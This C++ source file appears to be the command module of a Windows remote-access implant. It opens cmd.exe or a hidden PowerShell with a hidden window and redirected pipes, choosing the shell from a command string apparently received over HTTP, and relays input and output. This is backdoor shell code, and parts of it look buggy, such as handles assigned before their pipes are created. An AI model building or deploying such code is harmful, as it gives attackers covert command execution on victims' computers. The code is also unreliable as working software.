#include <winsock2.h>
#include <string>
#include "xhttp.h"
#include <iostream>
#include <stdio.h>
#include <thread>
#include <mutex>

namespace command{
char cmdProc[] = "cmd.exe /K";
char psProc[] = "powershell.exe -WindowStyle hidden -NoProfile";
std::mutex mtx;
bool procopen = false;
std::string aa = xhttp::cmdString;

std::string readFromCmd(HANDLE hStdOutRd) {
    constexpr size_t BUFFER_SIZE = 2048;
    std::vector<char> buffer(BUFFER_SIZE);
    std::string output;

    while (true) {
        DWORD bytesRead;
        if (!ReadFile(hStdOutRd, buffer.data(), BUFFER_SIZE, &bytesRead, NULL) || bytesRead == 0) {
            break;
        }
        output.append(buffer.data(), bytesRead);
    }

    return output;
}

void writeLoop(HANDLE hStdInWr) {
    while (true) {
        std::getline(std::cin, aa);
        if (aa == "exit")
            break;
        aa += "\r\n"; // Add newline as cmd.exe expects newline as Enter key
        DWORD bytesWritten;
        WriteFile(hStdInWr, aa.c_str(), aa.size(), &bytesWritten, NULL);
    }
}

int createProc(char* a) {
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    SECURITY_ATTRIBUTES saAttr;
    HANDLE hStdOutRd, hStdOutWr;
    HANDLE hStdInRd, hStdInWr;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.hStdError = hStdOutWr;
    si.hStdOutput = hStdOutWr;
    si.hStdInput = hStdInRd;
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    // Set the bInheritHandle flag for the pipe handles so they are inherited. 
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe for the child process's STDOUT. 
    if (!CreatePipe(&hStdOutRd, &hStdOutWr, &saAttr, 0)) {
        printf("CreatePipe failed (%d).\n", GetLastError());
        return 1;
    }

    // Ensure the read handle to the pipe for STDOUT is not inherited.
    if (!SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0)) {
        printf("SetHandleInformation failed (%d).\n", GetLastError());
        return 1;
    }

    // Create a pipe for the child process's STDIN. 
    if (!CreatePipe(&hStdInRd, &hStdInWr, &saAttr, 0)) {
        printf("CreatePipe failed (%d).\n", GetLastError());
        return 1;
    }

    // Ensure the write handle to the pipe for STDIN is not inherited. 
    if (!SetHandleInformation(hStdInWr, HANDLE_FLAG_INHERIT, 0)) {
        printf("SetHandleInformation failed (%d).\n", GetLastError());
        return 1;
    }

    // Set up members of the STARTUPINFO structure. 
    // This structure specifies the STDIN and STDOUT handles for redirection.


/*
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
*/
    // Create the child process. 
    if (!CreateProcessA(
        NULL,                  
        a,            
        NULL,                  // Process handle not inheritable
        NULL,                  // Thread handle not inheritable
        TRUE,                  // Set handle inheritance to TRUE
        0,                     // No creation flags
        NULL,                  // Use parent's environment block
        NULL,                  // Use parent's starting directory 
        &si,                   // Pointer to STARTUPINFO structure
        &pi)                   // Pointer to PROCESS_INFORMATION structure
    ) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return 1;
    }

    // Close pipe handles (do not continue to modify the parent). 
    // You need to keep the write end of the input pipe open.
    CloseHandle(hStdOutWr);
    CloseHandle(hStdInRd);

    // Start the input thread
    std::thread inputThread(writeLoop, hStdInWr);

    while (true) {
        procopen = true;
        std::string output = readFromCmd(hStdOutRd);
        if (output.empty()) {
            printf("Error reading.\n");
        }
        printf("Output from cmd or ps: %s\n", output.c_str());
    }

    // Join the input thread
    inputThread.join();
    
    // Wait until child process exits.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles. 
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    procopen = false;

    return 0;
}

void parseCmd(const std::string& aa) {
    if (!procopen) {
        if (mtx.try_lock()) { // Attempt to lock the mutex

        // aa needs to equal cmdResponse from xhttp
            std::lock_guard<std::mutex> lock(mtx, std::adopt_lock);
            std::cerr << "Parsing2: " << xhttp::cmdResponse << std::endl;
            if (xhttp::cmdResponse.substr(0, 3) == "cmd") {
                createProc(cmdProc);
            } else if (xhttp::cmdResponse.substr(0, 2) == "ps") {
                createProc(psProc);
            } else {
                std::cerr << "Not a valid command" << std::endl;
            }
            return;
        } else {
            std::cout << "mtx open" << std::endl;
            return;
        }
    }
}
////
}